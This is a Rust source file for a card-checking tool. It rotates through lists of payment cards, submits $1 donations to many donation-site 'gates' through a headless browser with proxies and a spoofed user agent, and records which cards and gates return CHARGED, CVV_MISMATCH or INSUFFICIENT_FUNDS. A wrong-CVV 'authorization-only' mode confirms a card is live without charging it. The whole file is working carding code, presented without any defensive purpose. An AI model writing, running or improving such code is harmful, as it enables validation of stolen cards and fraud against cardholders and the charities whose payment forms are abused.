//! Smart Card Rotation Strategy
//! 
//! Logic:
//! 1. For each gate, try multiple cards until one works
//! 2. Once a card works, mark it as "working card"
//! 3. Use that working card for all remaining gates
//! 4. When working card dies, find next working card
//! 5. Continue until all gates tested or all cards dead

use crate::common::{CardData, CheckResult, Gate};
use crate::proxy::ProxyPool;
use crate::proxy_extension::ProxyExtension;
use anyhow::Result;
use colored::*;
use std::fs;
use std::time::Duration;
use thirtyfour::prelude::*;

/// Try donation with timeout
async fn try_donation_with_timeout(
    driver: &WebDriver,
    card: &CardData,
    gate_url: &str,
    amount: f64,
    timeout_secs: u64,
) -> Result<String> {
    // Reuse the proven working try_donation from checker_v3
    tokio::time::timeout(
        Duration::from_secs(timeout_secs),
        crate::checker_v3::try_donation(driver, card, gate_url, amount)
    )
    .await?
}

/// Test if a card works on a gate (returns true if card is valid)
async fn test_card_on_gate(
    driver: &WebDriver,
    card: &CardData,
    gate: &Gate,
    auth_only: bool,
) -> Result<Option<CheckResult>> {
    // Create test card - use wrong CVV if in auth-only mode
    let test_card = if auth_only {
        CardData {
            number: card.number.clone(),
            month: card.month.clone(),
            year: card.year.clone(),
            cvv: "999".to_string(),
        }
    } else {
        card.clone()
    };
    
    // Try with $1 (cheapest test)
    match try_donation_with_timeout(driver, &test_card, &gate.url, 1.0, 25).await {
        Ok(status) => {
            let is_success = if auth_only {
                status == "CVV_MISMATCH"
            } else {
                status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS"
            };
            
            if is_success {
                Ok(Some(CheckResult {
                    gate: gate.url.clone(),
                    card: card.masked(),
                    amount: 1.0,
                    status,
                    success: true,
                }))
            } else {
                Ok(None)
            }
        }
        Err(_) => Ok(None),
    }
}

/// Smart checker: Find working card for each gate
pub async fn run_smart_checker(
    gates_file: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    auth_only: bool,
    proxy_file: Option<&str>,
) -> Result<()> {
    println!("\n{}", "═══════════════════════════════════════════════════════════".cyan());
    println!("{}", "🧠 SMART CARD ROTATION STRATEGY".bold().cyan());
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!();
    println!("{}", "Strategy:".yellow());
    println!("{}", "  1. For each gate, try cards until one works".dimmed());
    println!("{}", "  2. Once card works, use it for all remaining gates".dimmed());
    println!("{}", "  3. When card dies, find next working card".dimmed());
    println!("{}", "  4. Continue until all gates tested".dimmed());
    println!();
    
    // Display mode
    if auth_only {
        println!("{}", "🔐 MODE: Authorization-Only (FREE)".green());
        println!("{}", "   Using wrong CVV - no charges".yellow());
    } else {
        println!("{}", "💳 MODE: Charged ($1 per valid gate)".yellow());
        println!("{}", "   Using real CVV - cards will be charged!".red());
    }
    println!();
    
    // Load proxy pool
    let proxy_pool = if let Some(proxy_path) = proxy_file {
        println!("{}", "🔒 Loading proxies...".cyan());
        match ProxyPool::from_file(proxy_path) {
            Ok(pool) => {
                println!("{} Loaded {} proxies", "✓".green(), pool.len());
                Some(pool)
            }
            Err(e) => {
                println!("{} Failed to load proxies: {}", "⚠️".yellow(), e);
                None
            }
        }
    } else {
        None
    };
    
    // Load gates
    println!("{}", "📂 Loading gates...".cyan());
    let gates_content = fs::read_to_string(gates_file)?;
    let gates: Vec<Gate> = if gates_content.trim().starts_with('[') || gates_content.trim().starts_with('{') {
        serde_json::from_str(&gates_content)?
    } else {
        gates_content
            .lines()
            .filter(|line| !line.trim().is_empty() && !line.trim().starts_with('#'))
            .map(|line| Gate {
                url: line.trim().to_string(),
                gateway: String::new(),
                donation_form: false,
                title: None,
                has_shopify: false,
                has_shopify_payments: false,
                payment_gateway: None,
                donation_keywords_count: 0,
            })
            .collect()
    };
    
    let gates_to_use = if let Some(max) = max_gates {
        &gates[..max.min(gates.len())]
    } else {
        &gates[..]
    };
    
    println!("{} Loaded {} gates", "✓".green(), gates_to_use.len());
    
    // Load cards
    println!("{}", "💳 Loading cards...".cyan());
    let cards = crate::checker_v3::load_cards_from_file(cards_file)?;
    println!("{} Loaded {} cards", "✓".green(), cards.len());
    println!();
    
    // Setup WebDriver
    println!("{}", "🌐 Starting browser...".cyan());
    let mut caps = DesiredCapabilities::chrome();
    caps.add_arg("--headless")?;
    caps.add_arg("--no-sandbox")?;
    caps.add_arg("--disable-dev-shm-usage")?;
    caps.add_arg("--disable-gpu")?;
    caps.add_arg("--window-size=1920,1080")?;
    caps.add_arg("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")?;
    
    // Add proxy if available
    let _proxy_extension = if let Some(ref pool) = proxy_pool {
        if let Some(proxy) = pool.get_next() {
            println!("{} Using proxy: {}:{}", "🔒".cyan(), proxy.host, proxy.port);
            let ext = ProxyExtension::new(&proxy)?;
            caps.add_arg(&format!("--load-extension={}", ext.path_str()))?;
            Some(ext)
        } else {
            None
        }
    } else {
        None
    };
    
    let driver = WebDriver::new("http://localhost:9515", caps).await?;
    driver.set_page_load_timeout(Duration::from_secs(30)).await?;
    println!("{} Browser ready", "✓".green());
    println!();
    
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!("{}", "🚀 STARTING SMART GATE TESTING".bold().green());
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!();
    
    let mut all_results = Vec::new();
    let mut working_card_index: Option<usize> = None;
    let mut dead_card_indices = Vec::new();
    
    for (gate_idx, gate) in gates_to_use.iter().enumerate() {
        println!("{}", format!("━━━ Gate {}/{} ━━━", gate_idx + 1, gates_to_use.len()).bold().cyan());
        println!("{} {}", "URL:".dimmed(), gate.url);
        
        // If we have a working card, try it first
        if let Some(card_idx) = working_card_index {
            if !dead_card_indices.contains(&card_idx) {
                println!("{} Testing with working card #{}...", "→".cyan(), card_idx + 1);
                
                match test_card_on_gate(&driver, &cards[card_idx], gate, auth_only).await? {
                    Some(result) => {
                        println!("{} {} - Card #{} still works!", 
                            "✓".green(), result.status.green(), card_idx + 1);
                        all_results.push(result);
                        
                        // Save progress
                        let json = serde_json::to_string_pretty(&all_results)?;
                        fs::write(output_file, json)?;
                        
                        tokio::time::sleep(Duration::from_secs(2)).await;
                        continue;
                    }
                    None => {
                        println!("{} Card #{} died - finding new working card...", 
                            "✗".yellow(), card_idx + 1);
                        dead_card_indices.push(card_idx);
                        working_card_index = None;
                    }
                }
            }
        }
        
        // No working card - find one
        println!("{} Finding working card for this gate...", "→".cyan());
        let mut found_working_card = false;
        
        for (card_idx, card) in cards.iter().enumerate() {
            // Skip dead cards
            if dead_card_indices.contains(&card_idx) {
                continue;
            }
            
            println!("  {} Testing card #{}/{}...", "→".dimmed(), card_idx + 1, cards.len());
            
            match test_card_on_gate(&driver, card, gate, auth_only).await? {
                Some(result) => {
                    println!("  {} {} - Card #{} WORKS!", 
                        "✓".green(), result.status.green(), card_idx + 1);
                    
                    // Found working card!
                    working_card_index = Some(card_idx);
                    found_working_card = true;
                    all_results.push(result);
                    
                    // Save progress
                    let json = serde_json::to_string_pretty(&all_results)?;
                    fs::write(output_file, json)?;
                    
                    println!("{} Will use card #{} for remaining gates", 
                        "✓".green(), card_idx + 1);
                    break;
                }
                None => {
                    println!("  {} Card #{} failed", "✗".dimmed(), card_idx + 1);
                }
            }
            
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
        
        if !found_working_card {
            println!("{} No working cards found for this gate", "✗".red());
            
            // Check if all cards are dead
            if dead_card_indices.len() >= cards.len() {
                println!("{} All cards are dead - stopping", "✗".red());
                break;
            }
        }
        
        println!();
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    
    // Close browser
    driver.quit().await?;
    
    // Final summary
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!("{}", "✅ TESTING COMPLETE".bold().green());
    println!("{}", "═══════════════════════════════════════════════════════════".cyan());
    println!();
    println!("{} Gates tested: {}", "📊".cyan(), gates_to_use.len());
    println!("{} Valid gates found: {}", "✓".green(), all_results.len());
    println!("{} Cards used: {}", "💳".cyan(), dead_card_indices.len() + if working_card_index.is_some() { 1 } else { 0 });
    
    if !all_results.is_empty() {
        let total_cost: f64 = all_results.iter().map(|r| r.amount).sum();
        println!("{} Total cost: ${:.2}", "💰".yellow(), total_cost);
        println!();
        println!("{} Results saved to: {}", "✓".green(), output_file);
        
        // Save unique gates
        let unique_gates: Vec<String> = all_results
            .iter()
            .map(|r| r.gate.clone())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        
        let gates_file = output_file.replace(".json", "_gates.txt");
        fs::write(&gates_file, unique_gates.join("\n"))?;
        println!("{} Valid gates saved to: {}", "✓".green(), gates_file);
    }
    
    println!();
    Ok(())
}
